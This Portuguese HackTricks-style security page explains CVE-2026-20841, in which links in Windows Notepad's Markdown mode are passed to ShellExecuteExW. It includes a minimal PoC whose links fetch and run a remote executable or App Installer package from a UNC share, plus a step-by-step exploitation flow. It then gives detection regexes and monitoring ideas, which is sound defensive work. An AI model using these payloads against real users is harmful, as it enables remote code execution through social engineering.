# Abuso de Protocol Handler / ShellExecute do Windows (Renderizadores Markdown)

{{#include ../banners/hacktricks-training.md}}

Aplicativos modernos do Windows que renderizam Markdown/HTML frequentemente transformam links fornecidos pelo usuário em elementos clicáveis e os encaminham para `ShellExecuteExW`. Sem uma allowlist rigorosa de schemes, qualquer protocol handler registrado (por exemplo, `file:`, `ms-appinstaller:`) pode ser acionado, levando à execução de código no contexto do usuário atual.<sup>[[1]](#references)</sup>

## Superfície do ShellExecuteExW no modo Markdown do Windows Notepad
- O Notepad escolhe o modo Markdown **somente para extensões `.md`** por meio de uma comparação de strings fixa em `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Links Markdown suportados:
- Padrão: `[text](target)`
- Autolink: `<target>` (renderizado como `[target](target)`), portanto ambas as sintaxes são relevantes para payloads e detecções.
- Os cliques nos links são processados em `sub_140170F60()`, que realiza uma filtragem fraca e então chama `ShellExecuteExW`.
- `ShellExecuteExW` encaminha para **qualquer protocol handler configurado**, não apenas HTTP(S).<sup>[[1]](#references)</sup>

### Considerações sobre payload
- Quaisquer sequências `\\` no link são **normalizadas para `\`** antes de `ShellExecuteExW`, afetando a criação de UNC/path e a detecção.
- Arquivos `.md` **não são associados ao Notepad por padrão**; a vítima ainda precisa abrir o arquivo no Notepad e clicar no link, mas, depois de renderizado, o link fica clicável.
- Schemes perigosos de exemplo:<sup>[[1]](#references)</sup>
- `file://` para iniciar um payload local/UNC.
- `ms-appinstaller://` para acionar fluxos do App Installer. Outros schemes registrados localmente também podem ser abusados.

### PoC Markdown mínimo
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Fluxo de exploração
1. Crie um **arquivo `.md`** para que o Notepad o renderize como Markdown.
2. Incorpore um link usando um esquema URI perigoso (`file:`, `ms-appinstaller:` ou qualquer handler instalado).
3. Entregue o arquivo (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ou similar) e convença o usuário a abri-lo no Notepad.
4. Ao clicar, o **link normalizado** é passado para `ShellExecuteExW`, e o handler de protocolo correspondente executa o conteúdo referenciado no contexto do usuário.<sup>[[1]](#references)[[2]](#references)</sup>

## Ideias de detecção
- Monitore transferências de arquivos `.md` por portas/protocolos normalmente usados para entregar documentos: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analise links Markdown (padrão e autolink) e procure por `file:` ou `ms-appinstaller:` **sem diferenciação entre maiúsculas e minúsculas**.
- Regexes orientadas pelo fornecedor para detectar acesso a recursos remotos:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- O comportamento do patch supostamente **usa uma allowlist para arquivos locais e HTTP(S)**; qualquer outra coisa que alcance `ShellExecuteExW` é suspeita. Amplie as detecções para outros protocol handlers instalados conforme necessário, pois a attack surface varia de acordo com o sistema.<sup>[[1]](#references)</sup>

## Referências
- [1] [CVE-2026-20841: Execução arbitrária de código no Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC do CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
